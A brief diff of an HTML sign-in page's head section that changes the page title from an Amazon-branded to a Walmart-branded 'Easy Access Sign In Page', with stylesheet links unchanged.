@@ -9,7 +9,7 @@
 <html>
     <head>
         <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-        <title>Amazon Easy Access Sign In Page</title>
+        <title>Walmart Easy Access Sign In Page</title>
         <link href="css/bootstrapStuff.css" rel="stylesheet">
         <link href="css/bootstrapSignIn.css" rel="stylesheet">
     </head>
